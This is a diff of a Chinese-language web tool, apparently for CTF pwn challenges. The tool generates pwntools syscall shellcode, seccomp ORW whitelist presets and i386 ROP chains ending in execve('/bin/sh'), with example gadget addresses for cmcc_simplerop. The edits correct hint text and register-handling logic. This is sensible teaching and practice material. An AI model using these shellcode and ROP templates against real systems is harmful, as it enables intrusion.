@@ -198,7 +198,7 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
     <div class="quick">
       <button data-wl-preset="mmap">open / mmap / write {2,9,1}</button>
       <button data-wl-preset="orw">open / read / write {2,0,1}</button>
-      <button data-wl-preset="openat">openat 版 ORW {0,1,2,257,262}</button>
+      <button data-wl-preset="openat">openat 版 ORW {0,1,257,262}</button>
       <button data-wl-preset="">清空（不检查）</button>
     </div>
     <div class="btn-row">
@@ -258,11 +258,12 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
       <button class="btn btn-ghost" id="ropPreset42a">4.2a 清成 0 骨架</button>
     </div>
     <div class="rop-grid">
-      <div><label class="flabel" for="ropOffset">offset_to_ret（输入起点 → saved RIP 的填充数，cyclic 量）</label><input type="text" class="rop-input" id="ropOffset" value="0x20" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="ropOffset">offset_to_ret（输入起点 → saved RIP 的填充数，i386 模板里是 saved EIP，cyclic 量）</label><input type="text" class="rop-input" id="ropOffset" value="0x20" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="ropDelay">两次发送间隔（秒，4.1 / 4.1a 用；默认 0.3，连续发在 gets/大定长读下会挂）</label><input type="text" class="rop-input" id="ropDelay" value="0.3" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop42Str">要写入的字符串（4.2 / 4.2a 用；自动按 4 字节 / 8 字节分块，任意长度都行）</label><input type="text" class="rop-input" id="rop42Str" value="/bin/sh" autocomplete="off" spellcheck="false"></div>
     </div>
     <div class="rop-grid" id="ropG41">
+      <p class="foot" style="grid-column:1/-1;margin:0">以下 4 个 gadget / BSS 地址是 cmcc_simplerop 的示例值、未验证，按当前目标重测后填。</p>
       <div><label class="flabel" for="rop41PopEax">pop_eax_addr（pop eax; ret）</label><input type="text" class="rop-input" id="rop41PopEax" value="0x80bae06" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop41Pop3">pop3_addr（pop edx; pop ecx; pop ebx; ret）</label><input type="text" class="rop-input" id="rop41Pop3" value="0x806e850" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop41Int80">int80_addr（int 0x80; ret）</label><input type="text" class="rop-input" id="rop41Int80" value="0x806eef0" autocomplete="off" spellcheck="false"></div>
@@ -320,7 +321,7 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
       <li>输入原语提问已修：模板区上方四选一（gets/strcpy 类 / read 定长 / read-recv 循环读 / 还没确认，默认“还没确认”），警告与提示按选择分级。</li>
       <li>4.2 示例地址已标注：5 个 gadget 地址（binsh 0x080eb050、pop_eax 0x080b91e6、pop3 0x0806fc30、mov 0x080557ab、int80 0x0806d7e5）由用户提供、未验证，条件行、生成代码注释、预设 toast 三处均已标注，地址值本身未动。</li>
       <li>4.3 全 0 占位无问题：6 个输入默认全 0，生成代码含 SKELETON 占位说明，本轮未动 4.3 一字节。</li>
-      <li>已验证 ROP 逻辑无问题：pop3 弹出顺序是 edx→ecx→ebx，4.2 第二写块地址是 binsh+4，execve 均为 (path, 0, 0)，均未动。</li>
+      <li>已核对 ROP 逻辑无问题：pop3 弹出顺序是 edx→ecx→ebx，4.2 第二写块地址是 binsh+4，execve 均为 (path, 0, 0)，均未动。</li>
       <li>clone 顺序无问题：i386 是 tls 第 4、child_tidptr 第 5，amd64 反着，ROP 区改动不含 clone。</li>
       <li>白名单按名查号无问题：seccomp 白名单（第③节）本轮未动，ROP 区不含白名单改动。</li>
       <li>其余项待补充：评审清单原文未找到（artifact 内只有构建审计、goal 目录与 live 页均无该清单），除上述 11 项外无可核实内容，待提供原文后再补——本项不编造。</li>
@@ -1021,11 +1022,11 @@ function genericHint(sys, an, at){
   if(n==="sizemask")
     return ["fix","固定值，不是长度：sizemask 和 sigsetsize 一样，都是 sizeof(kernel_sigset_t)，amd64 和 i386 固定 8，填别的会直接 EINVAL；千万别填用户态 sigset_t 的 128",["8"]];
   if(n==="size" && sys==="clone3")
-    return ["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本固定 88（0x58）。填小了内核只认前面的字段，填大了会 EFAULT，别套长度三选一",["88"]];
+    return ["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本固定 88（0x58）。填大了（尾部非零、或超过一页）会返回 E2BIG，尾部全零的填大能被接受；填小到不足 64（最早版本 VER0 的大小）返回 EINVAL，别套长度三选一",["88"]];
   if(n==="size" && sys==="openat2")
     return ["fix","结构体大小，不是数据长度：size = sizeof(struct open_how)，固定 24（0x18）。别套长度三选一",["24"]];
   if(n==="size" && sys==="bpf")
-    return ["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，固定值，按 cmd 查对应结构体的尺寸，别套长度三选一",[]];
+    return ["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，整个 union 只有一个固定尺寸 144，不分 cmd，别套长度三选一",[]];
   // 4.7) 个数类（nfds/nsops/nsems/nr_*/maxevents…）：是数组/表格里有几个元素，不是字节数，别套长度三选一
   if(/^(nfds|nsops|nsems|nr_events|nr|maxevents|min_nr)$/.test(n) || /^nr_/.test(n))
     return ["cnt","元素个数，不是字节长度：指向的数组/表格里有几个元素就填几（如 poll 的 ufds 数组里有 3 个 pollfd 就填 3，semop 的 sops 数组里有几个操作就填几），必须和你实际准备的元素一一对应。跟数据有多少字节没关系，别套长度三选一",["1","2","3"]];
@@ -1060,10 +1061,10 @@ function genericHint(sys, an, at){
 var SRC_LABEL={fix:"固定值",rax:"上一步 rax / 地址",len:"自己定长度",cons:"常量查表",str:"字符串指针（pushstr）",cnt:"个数（不是字节数）",vec:"iovec 表格地址"};
 var RAX_AFTER={
  read:"rax = 实际读到的字节数（出错 = 负的 errno）",
- write:"rax = 实际写出的字节数",
+ write:"rax = 实际写出的字节数（出错 = 负的 errno）",
  open:"rax = 新文件的 fd（通常 ≥ 3，出错 = 负的 errno）",
- openat:"rax = 新文件的 fd（通常 ≥ 3）",
- mmap:"rax = 映射区的起始地址（fd 已被覆盖，之后要用先 mov 保存）",
+ openat:"rax = 新文件的 fd（通常 ≥ 3，出错 = 负的 errno）",
+ mmap:"rax = 映射区的起始地址（不是 fd；fd 参数走的是 r8（i386 的 mmap2 走 edi），调用后还在那个寄存器里；被返回值占掉的是 rax 本身——映射地址之后还要用，先 mov 保存）",
  mprotect:"rax = 0 成功 / 负的 errno",
  close:"rax = 0 成功 / 负的 errno",
  sendfile:"rax = 实际发送的字节数",
@@ -1073,7 +1074,7 @@ var RAX_AFTER={
  chmod:"rax = 0 成功 / 负数 = -errno（如 -EPERM 不是属主）",
  mkdir:"rax = 0 成功 / 负数 = -errno（如 -EEXIST 已存在）",
  unlink:"rax = 0 成功 / 负数 = -errno", rename:"rax = 0 成功 / 负数 = -errno",
- chown:"rax = 0 成功 / 负数 = -errno", access:"rax = 0 = 检查通过 / -1 = 不行（看 errno）",
+ chown:"rax = 0 成功 / 负数 = -errno", access:"rax = 0 = 检查通过 / 负数 = -errno（不行；裸 syscall 不像 libc 那样返回 -1）",
  bpf:"rax = 返回值是否 fd 取决于 cmd：建 map/prog 的 cmd 返回新 fd，其他 cmd 返回 0 或负的 errno，不是 fd"
 };
 function raxAfter(name){var t=RAX_AFTER[name]||"rax = 返回值（成功 ≥ 0，出错 = 负的 errno）";return archText(t);}
@@ -1083,9 +1084,9 @@ HINTS["mmap2:prot"]=["cons","常量查表：PROT_READ=1, WRITE=2, EXEC=4，可�
 HINTS["mmap2:flags"]=["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22。注意配对：flags 含 0x20（匿名）时 fd 必须改填 -1，匿名映射不需要 fd；只有文件映射才填 open 返回的 'rax'。",["2","0x22","1"]];
 HINTS["mmap2:fd"]=["rax","上一步 rax 返回：open 返回的 fd 还在 rax 里就填 'rax'；匿名映射填 -1",["'rax'","-1","3"]];
 HINTS["mmap2:pgoff"]=["fix","偏移，单位是页（0x1000 字节）不是字节：从文件开头映射填 0",["0"]];
-RAX_AFTER["mmap2"]="rax = 映射区的起始地址（fd 已被覆盖，之后要用先 mov 保存）";
+RAX_AFTER["mmap2"]="rax = 映射区的起始地址（不是 fd；fd 参数走的是 r8（i386 的 mmap2 走 edi），调用后还在那个寄存器里；被返回值占掉的是 rax 本身——映射地址之后还要用，先 mov 保存）";
 HINTS["socketcall:call"]=["cons","多路复用子调用号（i386 老内核没有独立 socket/bind/connect 调用，全走 socketcall）：SYS_SOCKET=1 建套接字, SYS_BIND=2, SYS_CONNECT=3, SYS_LISTEN=4, SYS_ACCEPT=5, SYS_GETSOCKNAME=6, SYS_GETPEERNAME=7, SYS_SOCKETPAIR=8, SYS_SEND=9, SYS_RECV=10, SYS_SENDTO=11, SYS_RECVFROM=12, SYS_SHUTDOWN=13, SYS_SETSOCKOPT=14, SYS_GETSOCKOPT=15, SYS_SENDMSG=16, SYS_RECVMSG=17",["1","3","4","5"]];
-HINTS["socketcall:args"]=["rax","参数块指针：socketcall 的第二个参数不是单个值，而是指向一个数组的指针，数组里依次放这个子调用的全部参数。先在栈上按顺序压好参数，再填 'rsp'",["'rsp'"]];
+HINTS["socketcall:args"]=["rax","参数块指针：socketcall 的第二个参数不是单个值，而是指向一个数组的指针，数组里依次放这个子调用的全部参数。在栈上搭这个数组要倒序压：最后一个参数先压、第一个参数最后压，压完 'rsp' 正好指向第一个参数，再填 'rsp'（正着压参数就全反了）",["'rsp'"]];
 HINTS["ipc:call"]=["cons","SysV IPC 多路复用子调用号：SEMOP=1, SEMGET=2, SEMCTL=3, SEMTIMEDOP=4, MSGSND=11, MSGRCV=12, MSGGET=13, MSGCTL=14, SHMAT=21, SHMDT=22, SHMGET=23, SHMCTL=24。i386 新内核（5.1+）也有独立的 semget(393)/msgget(399)/shmget(395) 等号，可以直接搜名字用独立号",["2","13","23"]];
 HINTS["ipc:first"]=["fix","第一个参数随子调用变：semget/msgget/shmget 时是 key（如 IPC_PRIVATE=0 或 ftok 生成的 key），拿到 id 之后的操作填那个 id（semid/msgid/shmid）。具体看 man 2 ipc",["0"]];
 HINTS["clone:tls"]=["rax","注意：clone 最后两个参数的顺序 amd64 与 i386 正好相反——amd64 是 child_tidptr 在前（第 4 个参数）、tls 最后（第 5 个）；i386 是 tls 在前（第 4 个）、child_tidptr 最后（第 5 个）。本页已按当前架构的顺序排列，照上面 ARG 的顺序填就行，别跨架构照搬",["0"]];
@@ -1096,9 +1097,9 @@ HINTS["clone:child_tidptr"]=["rax","注意：clone 最后两个参数的顺序 a
 HINTS["signalfd:sizemask"]=["fix","固定值，不是长度：sizemask = sizeof(kernel_sigset_t)，amd64 和 i386 都是 8，填别的会 EINVAL；千万别填用户态 sigset_t 的 128。本页已默认填 8",["8"]];
 HINTS["signalfd4:sizemask"]=["fix","固定值，不是长度：sizemask = sizeof(kernel_sigset_t)，amd64 和 i386 都是 8，填别的会 EINVAL；千万别填用户态 sigset_t 的 128。本页已默认填 8",["8"]];
 // clone3 / openat2 的 size 是结构体大小，不是数据长度
-HINTS["clone3:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本（VER2）固定 88（0x58）。填小了内核只认结构体前面的字段，填大了会 EFAULT。本页已默认填 88",["88"]];
+HINTS["clone3:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本（VER2）固定 88（0x58）。填大了（尾部非零、或超过一页）会返回 E2BIG，尾部全零的填大能被接受；填小到不足 64（最早版本 VER0 的大小）返回 EINVAL。本页已默认填 88",["88"]];
 HINTS["openat2:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct open_how) = 24（0x18），固定值。本页已默认填 24",["24"]];
-HINTS["bpf:size"]=["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，固定值，按 cmd 查对应结构体的尺寸（不同 cmd 用的结构体成员不同，尺寸以 man 2 bpf 里该 cmd 的说明为准），别套长度三选一。注意：bpf 的返回值是不是 fd 也取决于 cmd。",[]];
+HINTS["bpf:size"]=["fix","结构体大小，不是数据长度：size = sizeof(union bpf_attr)，整个 union 只有一个固定尺寸 144，不分 cmd（用哪个成员都不改变 union 的大小），别套长度三选一。注意：bpf 的返回值是不是 fd 也取决于 cmd。",[]];
 HINTS["epoll_create:size"]=["fix","遗留参数，不是长度：自 Linux 2.6.8 起 size 已被内核忽略，只要求大于 0（填 0 或负数会 EINVAL），填 1 即可；不要按“要监听几个 fd”去估算，也不要套长度三选一。本页已默认填 1",["1"]];
 // 个数类：是数组/表格的元素个数，不是字节长度，不给长度三选一
 HINTS["poll:nfds"]=["cnt","元素个数，不是字节长度：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应（只查 1 个 fd 就填 1）。跟每个 fd 上有多少数据没关系",["1","2","3"]];
@@ -1116,8 +1117,8 @@ HINTS["sethostname:len"]=["fix","主机名的字节数（不含结尾的 \\0）�
 HINTS["setdomainname:name"]=["str","字符串指针，域名：本页已自动生成 pushstr（上面框里填域名），这里传 'rsp'。靠下一个参数 len 定界",["'rsp'"]];
 HINTS["setdomainname:len"]=["fix","域名的字节数（不含结尾的 \\0）：上面框里填的是几个字符就填几，如 mydomain 填 8",["8"]];
 HINTS["fsconfig:key"]=["str","字符串指针 #3，参数名（如给 FSCONFIG_SET_STRING 指定挂载源时 key 填 source）：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。之前这个参数没进自动 pushstr、默认生成 0，等于没给 key",["'rsp'"]];
-HINTS["init_module:uargs"]=["str","字符串指针，模块参数字符串（如 debug=1 level=2 这种空格分隔的键值对）：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。没有参数就把上面框留空，这个参数会自动传 0",["'rsp'","0"]];
-HINTS["kexec_file_load:cmdline_ptr"]=["str","字符串指针，新内核的启动命令行：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。不需要命令行就把上面框留空，这个参数会自动传 0（cmdline_len 同时填 0）",["'rsp'","0"]];
+HINTS["init_module:uargs"]=["str","字符串指针，模块参数字符串（如 debug=1 level=2 这种空格分隔的键值对）：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。没有参数就把上面框留空，这个参数会自动传 0（参数还是自动值时；手动改成别的寄存器时按那个寄存器传）",["'rsp'","0"]];
+HINTS["kexec_file_load:cmdline_ptr"]=["str","字符串指针，新内核的启动命令行：本页已自动生成 pushstr（上面框里填），这里传 'rsp'。不需要命令行就把上面框留空，这个参数会自动传 0（参数还是自动值时，cmdline_len 同时填 0；手动改成别的寄存器时按那个寄存器传）",["'rsp'","0"]];
 HINTS["kexec_file_load:cmdline_len"]=["fix","cmdline 字符串的字节数：上面框里填了几个字符就填几；框留空（cmdline_ptr 传 0）时这里填 0",["0"]];
 HINTS["getgroups:gidsetsize"]=["cnt","元素个数，不是字节长度，必须和 grouplist 数组一一对应。两步 probe 用法：先 getgroups(0, NULL) 只问总数，返回值（gid 个数）在 rax 里；再准备好能装 rax 个 gid 的数组，用那个数做 size 正式调用一次，把组列表取回来",["0"]];
 HINTS["setgroups:gidsetsize"]=["cnt","元素个数，不是字节长度：等于你已经在 grouplist 数组里准备好的 gid 个数，必须一一对应；填 0（数组可为 NULL）= 清空所有附加组",["0","1","2"]];
@@ -1128,7 +1129,7 @@ HINTS["i386:eventfd2:initval"]=["fix","计数器初值 initval，根本不是长
 // 多字符串调用：每个字符串都单独 pushstr（mount 三个、xattr 家族两个、add_key/request_key）
 HINTS["mount:dev_name"]=["str","字符串指针 #1（源设备/文件系统名，如 tmpfs 就填 tmpfs）：本页自动 pushstr，传 'rsp'。mount 一共有三个字符串，别只压这一个",["'rsp'"]];
 HINTS["mount:dir_name"]=["str","字符串指针 #2（挂载点目录，如 /mnt/target，目录要先存在）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑，是 'ebp'）",[]];
-HINTS["mount:type"]=["str","字符串指针 #3（文件系统类型，如 tmpfs / ext4）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 没有第二个空闲寄存器，走手动 mov 顺序生成，参数框里填的是暂存寄存器 'edi'，别自己改）",[]];
+HINTS["mount:type"]=["str","字符串指针 #3（文件系统类型，如 tmpfs / ext4）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 没有第二个空闲寄存器，走手动 mov 顺序生成，参数框里填的是暂存寄存器 'edi'，别自己改；dir 留空时生成代码改存 'ebp'，参数框不用跟着改）",[]];
 ["setxattr","lsetxattr","getxattr","lgetxattr","removexattr","lremovexattr"].forEach(function(sn){ HINTS[sn+":name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑——setxattr/lsetxattr 的 flags 占着 edi，所以挑 'ebp'，别填 'edi'，会被 flags 覆盖）。只压 path 不压 name 的话这个参数会指错地方",[]]; });
 ["setxattrat","getxattrat","removexattrat"].forEach(function(sn){ HINTS[sn+":name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'）",[]]; });
 // setxattrat/getxattrat 的 i386 版是 6 参数（新版 *xattrat 签名多了 at_flags 和 args 结构体指针）：
@@ -1140,7 +1141,7 @@ HINTS["add_key:_type"]=["str","字符串指针 #1（key 类型，如 user / keyr
 HINTS["add_key:_description"]=["str","字符串指针 #2（key 的名字）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 是 'ebp'——add_key 的 keyring 参数占着 edi）",[]];
 HINTS["request_key:_type"]=["str","字符串指针 #1（key 类型，如 user）：本页自动 pushstr，传 'rsp'",["'rsp'"]];
 HINTS["request_key:_description"]=["str","字符串指针 #2（key 的名字）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 是 'ebp'）",[]];
-HINTS["request_key:_callout_info"]=["str","字符串指针 #3（callout 信息，没有就留空这个框、参数填 0）：框里留空时生成器会自动把这个参数传 0，不会连累前两个字符串的 pushstr；要用时填上，本页会先 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 是 'edi'，这个调用只用 4 个参数、edi 空闲）",["0"]];
+HINTS["request_key:_callout_info"]=["str","字符串指针 #3（callout 信息，没有就留空这个框、参数填 0）：框里留空时生成器会自动把这个参数传 0（参数还是自动值时；手动改成别的寄存器时按那个寄存器传），不会连累前两个字符串的 pushstr；要用时填上，本页会先 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 是 'edi'，这个调用只用 4 个参数、edi 空闲）",["0"]];
 // mount 的 data / xattr 的 value：不在自动 pushstr 范围内，明确标手动处理
 HINTS["mount:data"]=["rax","手动处理，不自动 pushstr：data 是文件系统私有的选项（如 tmpfs 的 size=16M 文本）。默认填 0 = 无附加选项，没问题；想传文本要自己多压一个 pushstr、把地址存进一个寄存器（如 mov r15, rsp）再填那个寄存器——本页只自动压 dev_name / dir_name / type 三个字符串，这第 4 个不自动",["0"]];
 HINTS["setxattr:value"]=["rax","手动处理，不自动 pushstr：本页只自动压 path 和 name 两个字符串。value 是属性值数据所在的地址：默认填 0 且 size 填 0 = 写一个空值；想写文本值，要自己先 pushstr 那段文本、把地址存进寄存器（如 r15）再填，或填数据本来所在的内存地址",["0"]];
@@ -1253,18 +1254,20 @@ function strMultiRegs(sys){ var r=[]; for(var k=0;k<3;k++){ var c=multiCanon(sys
 var STR2DEF={rename:["flag","flag.bak"],link:["flag","flag_hard"],symlink:["flag","flag_link"],renameat:["flag","flag.bak"],renameat2:["flag","flag.bak"],linkat:["flag","flag_hard"],symlinkat:["flag","flag_link"],pivot_root:["/newroot","oldroot"],move_mount:["flag","/mnt/target"]};
 function escStr(s){return s.replace(/\\/g,"\\\\").replace(/'/g,"\\'");}
 // i386 的 mount：5 个参数占了 ebx/ecx/edx/esi/edi，只剩 ebp 一个空闲寄存器，两个保存位不够用。
-// 不走 shellcraft.syscall（它内部 mov 的顺序没法保证不覆盖），改成手动 mov：type 先暂存 edi、dir 存 ebp，
-// 先把 type 从 edi 搬进 edx，之后 edi 才轮到放 data——顺序写死在生成结果里，不依赖 pwntools 的寄存器调度。
+// 不走 shellcraft.syscall（它内部 mov 的顺序没法保证不覆盖），改成手动 mov：dir 也要存时 type 先暂存 edi、dir 存 ebp，
+// 先把 type 从 edi 搬进 edx，之后 edi 才轮到放 data；dir 留空时 type 直接存 ebp——顺序写死在生成结果里，不依赖 pwntools 的寄存器调度。
 function mountManual32(sys, vals, strs, use){
   var flagsRaw=fmtVal(vals[3]).replace(/'/g,""), dataRaw=fmtVal(vals[4]).replace(/'/g,"");
-  // flags/data 的值本身就在暂存寄存器里（edi/ebp/eax/esp）时，晚搬会被前面的暂存步骤覆盖：
+  // flags/data 的值本身就在「读到它之前会被先写掉」的寄存器里时，晚搬会读到错的值：
+  // flags 在倒数第二步才读，那时 edx（type）、ecx（dir_name）、ebx（dev_name）都已赋值，edi/ebp/eax/esp 也被暂存和 pushstr 动过；
+  // data 最后才读，比 flags 还多一个 esi（flags 就写进 esi）。旧判定只查 edi/ebp/eax/esp，ebx/ecx/edx/esi 全部漏掉、静默出错。
   // 不再静默退回普通生成——在所有 pushstr/暂存之前先把冲突的值搬走。data 先搬（它可能要读 esi，而 flags 的提前搬运会写 esi），
   // flags 再搬进 esi（esi 在这之前没人动）；data 若走 edi 暂存位（dir 也要存时）则先暂存 eax（eax 只在最后放调用号，之前没人动），
   // 等 type 搬进 edx、edi 空出来后再从 eax 搬回 edi。
   // 顺序反过来会错：flags 的源正好是 data 的暂存目标时，flags 必须先搬；两者互相抢（flags 源 = data 暂存目标，且 data 源 = esi）
   // 时一次 xchg 同时换好两个值。
-  var flagsBad=/^(edi|ebp|eax|esp)$/.test(flagsRaw);
-  var dataBad=/^(edi|ebp|eax|esp)$/.test(dataRaw)||(flagsBad&&dataRaw==="esi");
+  var flagsBad=/^(edi|ebp|eax|esp|ebx|ecx|edx)$/.test(flagsRaw);
+  var dataBad=/^(edi|ebp|eax|esp|ebx|ecx|edx|esi)$/.test(dataRaw);
   var lines=[];
   var dDest=use[1] ? "eax" : "edi";
   var cycle=flagsBad && dataBad && flagsRaw===dDest && dataRaw==="esi";
@@ -1298,7 +1301,13 @@ function buildFullCode(sys, vals){
     var vals2=vals.slice(), use=[];
     for(var k=0;k<multi.idx.length;k++){
       var canon=multiCanon(sys,k);
-      if(!strs[k]){ vals2[multi.idx[k]]="0"; use[k]=false; } // 空字符串：这个参数直接传 0，不连累其它字符串的 pushstr
+      if(!strs[k]){
+        use[k]=false;
+        // 空字符串：参数还是自动值（空 / 0 / 保存寄存器）时才传 0，不连累其它字符串的 pushstr；
+        // 用户手动改成了别的寄存器/值就原样保留——旧逻辑无条件写 0，会把用户填的寄存器静默丢掉（口径与 STR2、单字符串一致）。
+        var rawV=vals[multi.idx[k]];
+        if(rawV==="" || fmtVal(rawV)==="0" || (canon && fmtVal(rawV)==="'"+physOf(canon)+"'")) vals2[multi.idx[k]]="0";
+      }
       else if(canon && (fmtVal(vals[multi.idx[k]])==="'"+physOf(canon)+"'" || vals[multi.idx[k]]==="" || fmtVal(vals[multi.idx[k]])==="0")){
         // 字符串框填了、参数框还是空/0（默认没预填，或用户清空了）：自动用保存寄存器（或 6 参数 i386 下的最终寄存器）补上，
         // 不能静默丢掉这个字符串。用户明确改成别的寄存器时才走手动处理。
@@ -1328,7 +1337,7 @@ function buildFullCode(sys, vals){
     var useB=!!s2 && (fmtVal(vals[two.b])==="'"+savePhys+"'" || vals[two.b]==="" || fmtVal(vals[two.b])==="0");
     if(useA) vals3[two.a]="'"+spReg()+"'";
     if(useB) vals3[two.b]="'"+savePhys+"'";
-    // 和多字符串一样逐个处理：某个框留空 = 只有那个参数传 0，另一个照常 pushstr。
+    // 和多字符串一样逐个处理：某个框留空 = 只有那个参数传 0（参数还是自动值时；手动改成别的寄存器时保留那个寄存器），另一个照常 pushstr。
     // 旧逻辑是任一为空就整段丢掉 pushstr、参数却还留着 'rsp'/保存寄存器，会传错指针（如 rename 把文件重命名到自身还返回 0）。
     if(!s1 && fmtVal(vals[two.a])==="'"+spReg()+"'") vals3[two.a]="0";
     if(!s2 && fmtVal(vals[two.b])==="'"+savePhys+"'") vals3[two.b]="0";
@@ -1342,7 +1351,7 @@ function buildFullCode(sys, vals){
   if(idx===undefined) return code;
   var sv=($("strInput").value||"").trim();
   if(!sv){
-    // 框留空 = 这个字符串参数传 0（如 init_module 的 uargs、kexec_file_load 的 cmdline_ptr 本来就常为空），不再留个 'rsp' 指着没压栈的位置
+    // 框留空 = 这个字符串参数传 0（参数还是自动值 'rsp' 时；手动改成别的寄存器时保留那个寄存器。如 init_module 的 uargs、kexec_file_load 的 cmdline_ptr 本来就常为空），不再留个 'rsp' 指着没压栈的位置
     if(fmtVal(vals[idx])==="'"+spReg()+"'"){ var v0=vals.slice(); v0[idx]="0"; return buildCode(sys, v0); }
     return code;
   }
@@ -1363,13 +1372,13 @@ function select(sys){
   $("regMap").innerHTML="<span><b>"+axReg()+"</b> = "+sys.nr+" (SYS_"+sys.name+")</span>"+sys.args.map(function(a,i){return "<span>ARG"+i+" <b>"+REGS[i]+"</b> = "+argName(a)+"</span>";}).join("");
   var warn=$("warnBox");
   if(STR_MULTI[sys.name]){
-    warn.textContent=archText("这个调用有 "+STR_MULTI[sys.name].idx.length+" 个字符串参数，每个都要单独 pushstr，不能共用一个 'rsp'，更不能只压第一个：生成顺序是先 pushstr 最后一个字符串并 mov 保存，最后 pushstr 第一个字符串传 'rsp'。每个字符串改上面对应的框，某个框留空 = 那个参数直接传 0，不影响其它字符串；把任一字符串参数改成别的寄存器时，那个字符串的 pushstr 会自动去掉，要自己保证字符串已经在那个地址。")+(arch==="i386" ? (sys.name==="mount" ? "i386 特别说明：mount 有 5 个参数，只剩 ebp 一个空闲寄存器，两个保存位不够——本页改走手动 mov 顺序生成（type 先暂存 edi、搬进 edx 之后 edi 才放 data，dir 存 ebp），不经 shellcraft.syscall，不依赖它内部 mov 的顺序。" : "i386 特别说明：保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）——比如 setxattr 的 flags 占着 edi，就改存 ebp，不会再被 flags 的赋值覆盖；mount 的 data 占 ebp 的情况同理。6 参数调用（如 setxattrat/getxattrat）没有空闲寄存器时，字符串直接进它自己的最终参数寄存器（name 进 esi），不另找保存寄存器。") : "");
+    warn.textContent=archText("这个调用有 "+STR_MULTI[sys.name].idx.length+" 个字符串参数，每个都要单独 pushstr，不能共用一个 'rsp'，更不能只压第一个：生成顺序是先 pushstr 最后一个字符串并 mov 保存，最后 pushstr 第一个字符串传 'rsp'。每个字符串改上面对应的框，某个框留空 = 那个参数直接传 0（参数手动改成别的寄存器时按那个寄存器传），不影响其它字符串；把任一字符串参数改成别的寄存器时，那个字符串的 pushstr 会自动去掉，要自己保证字符串已经在那个地址。")+(arch==="i386" ? (sys.name==="mount" ? "i386 特别说明：mount 有 5 个参数，只剩 ebp 一个空闲寄存器，两个保存位不够——本页改走手动 mov 顺序生成（dir 填了时：type 先暂存 edi、搬进 edx 之后 edi 才放 data，dir 存 ebp；dir 留空时：type 直接存 ebp），不经 shellcraft.syscall，不依赖它内部 mov 的顺序。另外手动路径里 dev/dir/type 三个指针只由字符串框构造：框留空就是传 0，参数框手改的寄存器不会保留（和上面通用说法不同）。" : "i386 特别说明：保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）——比如 setxattr 的 flags 占着 edi，就改存 ebp，不会再被 flags 的赋值覆盖；mount 的 data 占 ebp 的情况同理。6 参数调用（如 setxattrat/getxattrat）没有空闲寄存器时，字符串直接进它自己的最终参数寄存器（name 进 esi），不另找保存寄存器。") : "");
     warn.classList.add("show");
   } else if(STR2[sys.name]){
-    warn.textContent=archText("这个调用有两个文件名参数，都是指针，不能直填字符串。生成顺序是：先 pushstr 第二个名字（新名）并 mov "+str2Canon(sys)+", rsp 保存，再 pushstr 第一个名字（旧名）传 'rsp'。两个名字分别改上面两个框，某个框留空 = 只有那个参数传 0，另一个照常 pushstr（旧版任一为空会把两个都丢掉、参数还指着没压栈的位置）；把任一参数改成别的寄存器时，pushstr 会自动去掉，那种情况要自己保证字符串已经在那个地址。")+(arch==="i386" ? archText("i386 的保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）：renameat2/linkat/move_mount 的 flags 占着 edi，所以存 ebp，不会被覆盖。") : "");
+    warn.textContent=archText("这个调用有两个文件名参数，都是指针，不能直填字符串。生成顺序是：先 pushstr 第二个名字（新名）并 mov "+str2Canon(sys)+", rsp 保存，再 pushstr 第一个名字（旧名）传 'rsp'。两个名字分别改上面两个框，某个框留空 = 只有那个参数传 0（参数手动改成别的寄存器时按那个寄存器传），另一个照常 pushstr（旧版任一为空会把两个都丢掉、参数还指着没压栈的位置）；把任一参数改成别的寄存器时，pushstr 会自动去掉，那种情况要自己保证字符串已经在那个地址。")+(arch==="i386" ? archText("i386 的保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）：renameat2/linkat/move_mount 的 flags 占着 edi，所以存 ebp，不会被覆盖。") : "");
     warn.classList.add("show");
   } else if(STRARG[sys.name]!==undefined){
